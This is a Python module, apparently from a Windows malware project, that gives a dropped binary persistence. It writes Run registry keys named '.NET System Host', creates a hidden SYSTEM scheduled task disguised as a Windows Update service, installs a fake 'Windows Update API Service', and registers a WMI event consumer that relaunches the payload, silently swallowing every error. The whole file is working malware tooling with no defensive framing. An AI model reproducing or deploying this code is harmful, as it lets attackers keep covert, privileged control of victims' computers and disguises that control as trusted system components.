import winreg
import os
import win32service
import win32serviceutil
import win32event
import servicemanager
import win32com.client
import pythoncom
from datetime import datetime, timedelta
from .copy_to_temp import TEMP_PATH as TEMP

def registry():
        key1 = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key1, ".NET System Host", 0, winreg.REG_SZ, TEMP)
        winreg.CloseKey(key1)

        key2 = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key2, ".NET System Host", 0, winreg.REG_SZ, TEMP)
        winreg.CloseKey(key2)

def scheduled_task():

        import subprocess
        
        task_name = "WindowsUpdateService"
        task_xml = f'''
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Service</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{TEMP}"</Command>
    </Exec>
  </Actions>
</Task>
'''
        xml_path = os.path.join(os.environ['TEMP'], 'task.xml')
        with open(xml_path, 'w') as f:
            f.write(task_xml)
        
        result = subprocess.run(
            ['schtasks', '/create', '/tn', task_name, '/xml', xml_path, '/f'],
            capture_output=True,
            text=True
        )
        
        os.remove(xml_path)

class WindowsUpdateService(win32serviceutil.ServiceFramework):
    _svc_name_ = "WuApiServ"
    _svc_display_name_ = "Windows Update API Service"
    _svc_description_ = "Provides API support for Windows Update components"
    
    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        
    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        
    def SvcDoRun(self):
        import subprocess
        try:
            subprocess.Popen([TEMP], shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
        
        win32event.WaitForSingleObject(self.hWaitStop, win32event.INFINITE)

def install_service():
    try:
        win32serviceutil.InstallService(
            PythonClass=WindowsUpdateService,
            serviceName=WindowsUpdateService._svc_name_,
            displayName=WindowsUpdateService._svc_display_name_,
            startType=win32service.SERVICE_AUTO_START,
            description=WindowsUpdateService._svc_description_
        )
        
        import subprocess
        subprocess.run(['sc', 'start', WindowsUpdateService._svc_name_], 
                      capture_output=True, shell=True)
        
        
    except Exception as e:
        pass

def wmi_event():
    try:
        pythoncom.CoInitialize()
        
        wmi = win32com.client.GetObject('winmgmts:')
        
        event_filter = wmi.Get('__EventFilter').SpawnInstance_()
        event_filter.Name = 'SystemStartupFilter'
        event_filter.Query = 'SELECT * FROM Win32_ComputerShutdownEvent'
        event_filter.QueryLanguage = 'WQL'
        event_filter.EventNamespace = 'root\\cimv2'
        filter_path = event_filter.Put_()
        
        event_consumer = wmi.Get('ActiveScriptEventConsumer').SpawnInstance_()
        event_consumer.Name = 'StartupScriptConsumer'
        event_consumer.ScriptingEngine = 'VBScript'
        event_consumer.ScriptText = f'''
            Set WshShell = CreateObject("WScript.Shell")
            WshShell.Run "{TEMP}", 0, False
        '''
        consumer_path = event_consumer.Put_()
        
        binding = wmi.Get('__FilterToConsumerBinding').SpawnInstance_()
        binding.Filter = filter_path
        binding.Consumer = consumer_path
        binding.Put_()
                
    except Exception as e:
        pass

def establish_persistence():
    registry()
    scheduled_task()
    install_service()
    wmi_event()
